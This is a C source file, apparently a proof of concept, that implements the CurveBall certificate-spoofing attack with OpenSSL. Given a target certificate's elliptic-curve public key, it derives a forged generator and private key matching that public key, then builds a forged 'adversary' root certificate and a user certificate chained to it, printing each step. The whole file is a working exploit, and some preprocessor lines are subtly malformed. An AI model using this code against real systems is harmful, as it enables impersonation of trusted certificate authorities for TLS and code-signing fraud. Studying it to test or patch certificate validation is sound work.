#include "curveball.h"
#include "make_cert.h"
#include "ecqv.h"
#include <openssl/opensslv.h>

#define DEBUG
#define PRINT_STEP

extern BN_CTX* bn_ctx;

bool curveball_keygen(const EC_POINT* P, const EC_GROUP* G, BIGNUM** d, EC_GROUP** newG) {
	BIGNUM* dp = NULL, *t = NULL;
	const BIGNUM* h = NULL;
	const BIGNUM* n = NULL;
	
	EC_POINT* newGp = NULL;
	EC_GROUP* newGgp = NULL;
	BIGNUM* p = NULL, * a = NULL, * b = NULL;
	int group_type = 0;         // 记录group是素数域还是伽罗华域

	if (!P || !G) goto ERR;

	// init
	if (!d || !*d) {
		if (!(dp = BN_new())) {
			goto ERR;
		}
	}
	else {
		dp = *d;
	}
	if (newG && *newG) {
		EC_GROUP_free(*newG);
	}
#ifdef OPENSSL_VERSION_MAJOR >= 3
	group_type = EC_GROUP_get_field_type(G);
#else
	group_type = NID_X9_62_prime_field; //怎么获取？
#endif
	if (!(p = BN_new()) ||
		!(a = BN_new()) ||
		!(b = BN_new()) ||
		!EC_GROUP_get_curve(G, p, a, b, bn_ctx)
		) {
		goto ERR;
	}
	if (!(n = EC_GROUP_get0_order(G))) {
		goto ERR;
	}
	if (!(h = EC_GROUP_get0_cofactor(G))) {
		goto ERR;
	}
	if (!(newGp = EC_POINT_new(G))) {
		goto ERR;
	}


	// select d'
	if (!BN_rand_range(dp, n)) {
		goto ERR;
	}

	// calculate t = (d')^-1
	if (!(t = BN_mod_inverse(NULL, dp, n, bn_ctx))) {
		goto ERR;
	}

	// calculate G' = t * P
	if (!(EC_POINT_mul(G, newGp, NULL, P, t, bn_ctx))) {
		goto ERR;
	}

	// get E(G')
	if (group_type == NID_X9_62_prime_field) {
		if (!(newGgp = EC_GROUP_new_curve_GFp(p, a, b, bn_ctx))) {
			goto ERR;
		}
	}
	else { // group_type == NID_X9_62_characteristic_two_field
		if (!(newGgp = EC_GROUP_new_curve_GF2m(p, a, b, bn_ctx))) {
			goto ERR;
		}
	}
	if (!EC_GROUP_set_generator(newGgp, newGp, n, h)) {
		goto ERR;
	}
	
	// set return value
	if (d) *d = dp;
	if (newG) *newG = newGgp;
	
	if (newGp) EC_POINT_free(newGp);
#ifdef OPENSSL_VERSION_MAJOR >= 3
	if (p) BN_free(p);
	if (a) BN_free(a);
	if (b) BN_free(b);
#endif
	return true;
ERR:
	if (newGgp) EC_GROUP_free(newGgp);
#ifdef OPENSSL_VERSION_MAJOR >= 3
	if (p) BN_free(p);
	if (a) BN_free(a);
	if (b) BN_free(b);
#endif
	if (dp) BN_free(dp);
	if (newGp) EC_POINT_free(newGp);
	return false;
}

bool curveball_explicit(X509* target, EC_KEY** user_key, X509** user_crt, STACK_OF(X509)** others) {
	EVP_PKEY* Pkey = NULL;		// 目标公钥
	const EC_KEY* Pec = NULL;   // 目标公钥
	const EC_POINT* P = NULL;   // 目标公钥
	const EC_GROUP* G = NULL;   // 目标参数
	BIGNUM* dp = NULL;			// 伪造私钥
	EC_GROUP* Gp = NULL;		// 伪造公钥参数
	EC_KEY* a_key = NULL, *u_key = NULL; 
	X509* a_cert = NULL, *u_cert = NULL;
	STACK_OF(X509)* other_certs = NULL; // 返回值
#ifdef PRINT_STEP
	const unsigned char* test = NULL; int test_len;
	printf("\n## Step 1: Init...\n");
#endif
	if (!target) {
		goto ERR;
	}

	if (!(Pkey = X509_get0_pubkey(target)) || 
#ifdef OPENSSL_VERSION_MAJOR >= 3
		EVP_PKEY_get_base_id(Pkey) != EVP_PKEY_EC ||
#endif
		!(Pec = EVP_PKEY_get0_EC_KEY(Pkey)) || 
		!(P = EC_KEY_get0_public_key(Pec)) ||
		!(G = EC_KEY_get0_group(Pec))
	) {
		goto ERR;
	}
#ifdef DEBUG
	//ecqv_print_key(stdout, "target P", "target d", Pec, bn_ctx);
	ecqv_print_cert(stdout, "target", target);
#endif

#ifdef PRINT_STEP
	printf("\n## Step 2: Calculate a secret d' and the new group G'\n");
#endif
	if (!curveball_keygen(P, G, &dp, &Gp) || !dp || !Gp) {
		goto ERR;
	}
	if (!(a_key = EC_KEY_new()) ||
		!EC_KEY_set_group(a_key, Gp) ||
		!EC_KEY_set_private_key(a_key, dp) || 
		!EC_KEY_set_public_key(a_key, P)
	) {
		goto ERR;
	}
#ifdef DEBUG
	ecqv_print_key(stdout, "forged P", "forged d", a_key, bn_ctx);
#endif

	// do checking
	if (!EC_KEY_check_key(a_key)) {
#ifdef PRINT_STEP
		printf("The forged key-pair is unmatched!\n");
#endif
		goto ERR;
	}
#ifdef PRINT_STEP
	printf("\n## Step 3: Generate a forged root certificate\n");
#endif
	if (!make_root_certificate(
		TYPE_EXPLICIT,
		 "adversary", 
		&a_cert,
		&a_key
	) || !a_cert || !a_key) {
		goto ERR;
	}
#ifdef DEBUG
	ecqv_print_cert(stdout, "forged root", a_cert);
#endif
#ifdef PRINT_STEP
	printf("\n## Step 4: Generate a user certificate\n");
#endif
	if (!make_user_certificate(
		TYPE_EXPLICIT,
		"user",
		a_cert,
		a_key, 
		&u_cert, 
		&u_key
	) || !u_cert || !u_key) {
		goto ERR;
	}
#ifdef DEBUG
	ecqv_print_cert(stdout, "forged user", u_cert);
#endif
#ifdef PRINT_STEP
	printf("\n## Step 4: Make Output\n");
#endif	
	if (!(other_certs = sk_X509_new_null())) {
		goto ERR;
	}
	sk_X509_push(other_certs, a_cert);

	if (user_key) *user_key = u_key;
	if (user_crt) *user_crt = u_cert;
	if (others) *others = other_certs;

	if (dp) BN_free(dp);
	if (Gp) EC_GROUP_free(Gp);
	if (a_key) EC_KEY_free(a_key);
	return true;
ERR:
	if (dp) BN_free(dp);
	if (Gp) EC_GROUP_free(Gp);
	if (a_cert) X509_free(a_cert);
	if (a_key) EC_KEY_free(a_key);
	return false;
}